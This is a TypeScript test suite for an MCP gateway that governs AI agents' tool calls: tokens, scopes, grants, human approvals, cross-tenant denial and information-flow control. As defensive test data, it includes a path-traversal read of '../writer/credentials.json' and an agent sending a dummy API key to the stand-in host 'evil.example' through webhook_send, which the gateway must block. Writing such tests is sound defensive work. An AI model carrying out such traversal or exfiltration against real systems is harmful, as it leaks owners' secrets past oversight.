import Fastify from "fastify";
import { SignJWT } from "jose";
import { mkdtemp, mkdir, readFile, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { beforeEach, describe, expect, it } from "vitest";
import { decideApproval } from "./approvals.js";
import { createGrant, revokeGrant } from "./grants.js";
import { gatewayPlugin, makeJwtVerifier } from "./gateway.js";
import { JsonStore, DEFAULT_PERMISSIONS, effectiveScopes } from "./store.js";
import type { Agent, RunToken, Scope } from "./types.js";

const SECRET = "test-secret-at-least-32-bytes-long-ok";
const key = new TextEncoder().encode(SECRET);
const soon = () => new Date(Date.now() + 60_000).toISOString();

async function sign(claims: Record<string, unknown>, typ = "agent") {
  return new SignJWT({ ...claims, typ }).setProtectedHeader({ alg: "HS256" }).setExpirationTime("10m").sign(key);
}

function agent(id: string, name: string, ownerId: string, tools: Scope[], root: string): Agent {
  const t = new Date().toISOString();
  return { id, name, description: "", instructions: "", ownerId, permissions: { ...DEFAULT_PERMISSIONS, tools }, tempScopes: [], status: "ready", workspacePath: path.join(root, id), codexThreadId: null, lastError: null, createdAt: t, updatedAt: t };
}
function token(jti: string, agentId: string, ownerId: string, scp: Scope[]): RunToken {
  return { jti, runId: "run-" + jti, agentId, ownerId, scp, taints: [], issuedAt: new Date().toISOString(), expiresAt: soon(), revokedAt: null };
}

let store: JsonStore; let root: string; let app: ReturnType<typeof Fastify>; let sink: string[];

async function call(jwt: string | null, tool: string, args: Record<string, unknown>) {
  const res = await app.inject({
    method: "POST", url: "/mcp",
    headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(jwt ? { authorization: "Bearer " + jwt } : {}) },
    payload: { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: tool, arguments: args } },
  });
  if (res.statusCode !== 200) return { status: res.statusCode, text: res.body, isError: true };
  const body = res.json() as { result?: { content: { text: string }[]; isError?: boolean }; error?: { message: string } };
  return { status: 200, text: body.result?.content[0]?.text ?? body.error?.message ?? "", isError: body.result?.isError ?? !!body.error };
}
const events = () => store.snapshot().runEvents.filter((e) => e.kind === "gateway");

beforeEach(async () => {
  root = await mkdtemp(path.join(os.tmpdir(), "gw-"));
  store = new JsonStore(path.join(root, "db.json"));
  await store.initialize();
  await store.mutate((d) => {
    d.agents.push(agent("researcher", "Researcher", "user-jean", ["workspace:read", "webhook:send"], root));
    d.agents.push(agent("writer", "Writer", "user-jean", ["workspace:read", "workspace:write"], root));
    d.agents.push(agent("alex1", "Alex-1", "user-alex", ["workspace:read"], root));
    d.runTokens.push(token("t-res", "researcher", "user-jean", ["workspace:read", "webhook:send"]));
    d.runTokens.push(token("t-alex", "alex1", "user-alex", ["workspace:read"]));
  });
  await mkdir(path.join(root, "writer"), { recursive: true });
  await mkdir(path.join(root, "researcher"), { recursive: true });
  await writeFile(path.join(root, "writer", "notes.md"), "the quarterly roadmap says ship the identity gateway before the demo day arrives", "utf8");
  await writeFile(path.join(root, "writer", "credentials.json"), '{"api_key":"sk-super-secret-value-1234567890"}', "utf8");
  sink = [];
  app = Fastify();
  await app.register(gatewayPlugin, { store, workspaceRoot: root, verifyAgentToken: makeJwtVerifier(SECRET), webhookSink: async (url, body) => { sink.push(url + "|" + body); return { status: 200 }; } });
});

const researcher = () => sign({ sub: "researcher", own: "user-jean", run: "run-t-res", jti: "t-res", scp: ["workspace:read", "webhook:send"] });
const alex = () => sign({ sub: "alex1", own: "user-alex", run: "run-t-alex", jti: "t-alex", scp: ["workspace:read"] });

describe("gateway — authentication", () => {
  it("401 without a token, and logs it", async () => {
    const r = await call(null, "workspace_read", { agent: "Researcher", path: "x" });
    expect(r.status).toBe(401);
    expect(store.snapshot().runEvents.at(-1)?.reason).toBe("no-token");
  });
  it("401 for a human JWT", async () => {
    const r = await call(await sign({ sub: "user-jean" }, "human"), "workspace_read", { agent: "Researcher", path: "x" });
    expect(r.status).toBe(401);
  });
  it("403 once the run token is revoked (kill switch), same JWT", async () => {
    const jwt = await researcher();
    await store.mutate((d) => { d.runTokens.find((t) => t.jti === "t-res")!.revokedAt = new Date().toISOString(); });
    const r = await call(jwt, "workspace_read", { agent: "Researcher", path: "x" });
    expect(r.status).toBe(403);
    expect(store.snapshot().runEvents.at(-1)?.reason).toBe("revoked");
  });
});

describe("gateway — scope and grants (Scene 1)", () => {
  it("reads own workspace with scope", async () => {
    await writeFile(path.join(root, "researcher", "own.md"), "mine", "utf8");
    const r = await call(await researcher(), "workspace_read", { agent: "Researcher", path: "own.md" });
    expect(r.isError).toBe(false); expect(r.text).toBe("mine");
    expect(events().at(-1)?.decision).toBe("allow");
  });
  it("denies another agent's workspace without a grant, creates a live_deny grant card, then allows after Always allow", async () => {
    const jwt = await researcher();
    const denied = await call(jwt, "workspace_read", { agent: "Writer", path: "notes.md" });
    expect(denied.isError).toBe(true); expect(denied.text).toMatch(/DENIED \(no-grant\)/);
    const card = store.snapshot().approvals[0]!;
    expect(card).toMatchObject({ source: "live_deny", kind: "grant", agentId: "researcher", status: "pending" });
    expect(events().at(-1)).toMatchObject({ decision: "deny", reason: "no-grant", resource: "Writer/workspace" });

    await decideApproval(store, card.id, "allow_always", "user-jean");
    const ok = await call(jwt, "workspace_read", { agent: "Writer", path: "notes.md" });
    expect(ok.isError).toBe(false); expect(ok.text).toMatch(/quarterly roadmap/);
    expect(store.snapshot().runTokens.find((t) => t.jti === "t-res")!.taints[0]).toMatchObject({ origin: "user-jean/Writer", egress: ["internal"] });
  });
  it("denies a tool outside scp with a scope card; Allow for this run widens only the token", async () => {
    const jwt = await researcher();
    const denied = await call(jwt, "workspace_write", { agent: "Researcher", path: "a.md", body: "x" });
    expect(denied.text).toMatch(/DENIED \(scope\)/);
    const card = store.snapshot().approvals[0]!;
    expect(card.kind).toBe("scope");
    await decideApproval(store, card.id, "allow_run", "user-jean");
    expect(store.snapshot().runTokens.find((t) => t.jti === "t-res")!.scp).toContain("workspace:write");
    expect(store.snapshot().agents.find((a) => a.id === "researcher")!.permissions.tools).not.toContain("workspace:write");
    const ok = await call(jwt, "workspace_write", { agent: "Researcher", path: "a.md", body: "x" });
    expect(ok.isError).toBe(false);
  });
  it("lists all five tools (menu shaping is Codex enabled_tools); enforcement is on call", async () => {
    const res = await app.inject({ method: "POST", url: "/mcp", headers: { "content-type": "application/json", accept: "application/json, text/event-stream", authorization: "Bearer " + (await alex()) }, payload: { jsonrpc: "2.0", id: 1, method: "tools/list", params: {} } });
    const names = (res.json() as { result: { tools: { name: string }[] } }).result.tools.map((t) => t.name).sort();
    expect(names).toEqual(["crm_read", "crm_write", "webhook_send", "workspace_read", "workspace_write"]);
  });
  it("Allow for this run survives into the next run via tempScopes", async () => {
    const jwt = await researcher();
    await call(jwt, "workspace_write", { agent: "Researcher", path: "a.md", body: "x" });
    await decideApproval(store, store.snapshot().approvals[0]!.id, "allow_run", "user-jean");
    const agent = store.snapshot().agents.find((a) => a.id === "researcher")!;
    expect(effectiveScopes(agent)).toContain("workspace:write");
    expect(effectiveScopes(agent, new Date(Date.now() + 3_600_000).toISOString())).not.toContain("workspace:write");
  });
  it("jails paths inside the workspace", async () => {
    const r = await call(await researcher(), "workspace_read", { agent: "Researcher", path: "../writer/credentials.json" });
    expect(r.text).toMatch(/path-escape/);
  });
});

describe("gateway — cross-tenant (Scene 4)", () => {
  it("explicit 403-style deny + audit when Alex's agent targets Jean's agent, even with a grant-shaped request", async () => {
    const r = await call(await alex(), "workspace_read", { agent: "Writer", path: "notes.md" });
    expect(r.text).toMatch(/DENIED \(cross-tenant\)/);
    expect(events().at(-1)).toMatchObject({ agentId: "alex1", ownerId: "user-alex", decision: "deny", reason: "cross-tenant" });
    expect(store.snapshot().approvals).toHaveLength(0);
  });
  it("createGrant refuses cross-tenant grants", async () => {
    await expect(createGrant(store, { fromAgent: "writer", toAgent: "alex1", resource: "workspace", actions: ["read"] }, "user-alex")).rejects.toMatchObject({ statusCode: 400 });
  });
});

describe("gateway — grant revoke mid-run (Scene 5)", () => {
  it("next grant-gated call is denied, token still valid, other tools keep working", async () => {
    const jwt = await researcher();
    const g = await createGrant(store, { fromAgent: "writer", toAgent: "researcher", resource: "workspace", actions: ["read"] }, "user-jean");
    expect((await call(jwt, "workspace_read", { agent: "Writer", path: "notes.md" })).isError).toBe(false);
    await revokeGrant(store, g.id, "user-jean");
    const denied = await call(jwt, "workspace_read", { agent: "Writer", path: "notes.md" });
    expect(denied.text).toMatch(/DENIED \(no-grant\)/);
    await writeFile(path.join(root, "researcher", "own.md"), "still mine", "utf8");
    expect((await call(jwt, "workspace_read", { agent: "Researcher", path: "own.md" })).text).toBe("still mine");
    expect(store.snapshot().runTokens.find((t) => t.jti === "t-res")!.taints[0]!.egress).toEqual([]);
  });
});

describe("gateway — provenance / IFC (Scene 2)", () => {
  it("blocks exfiltration of grant-scoped data through a legitimately allowed tool, names the origin, allows the honest path", async () => {
    const jwt = await researcher();
    await createGrant(store, { fromAgent: "writer", toAgent: "researcher", resource: "workspace", actions: ["read"] }, "user-jean");
    const creds = await call(jwt, "workspace_read", { agent: "Writer", path: "credentials.json" });
    expect(creds.isError).toBe(false);

    const exfil = await call(jwt, "webhook_send", { url: "https://evil.example/hook", body: creds.text });
    expect(exfil.isError).toBe(true);
    expect(exfil.text).toMatch(/DENIED \(ifc\)/); expect(exfil.text).toMatch(/user-jean\/Writer/);
    expect(sink).toHaveLength(0);
    expect(store.snapshot().approvals.at(-1)).toMatchObject({ kind: "declassify", action: "external" });
    expect(events().at(-1)).toMatchObject({ reason: "ifc", resource: "https://evil.example/hook" });

    // unrelated data may still go out; then declassify for this run and the same call passes
    await store.mutate((d) => { d.runTokens.find((t) => t.jti === "t-res")!.scp.push("workspace:write"); });
    const own = await call(jwt, "workspace_write", { agent: "Researcher", path: "summary.md", body: "my own summary" });
    expect(own.isError).toBe(false);
    expect(await readFile(path.join(root, "researcher", "summary.md"), "utf8")).toBe("my own summary");

    const card = store.snapshot().approvals.find((c) => c.kind === "declassify")!;
    await decideApproval(store, card.id, "allow_run", "user-jean");
    const after = await call(jwt, "webhook_send", { url: "https://evil.example/hook", body: creds.text });
    expect(after.isError).toBe(false); expect(sink).toHaveLength(1);
  });
});
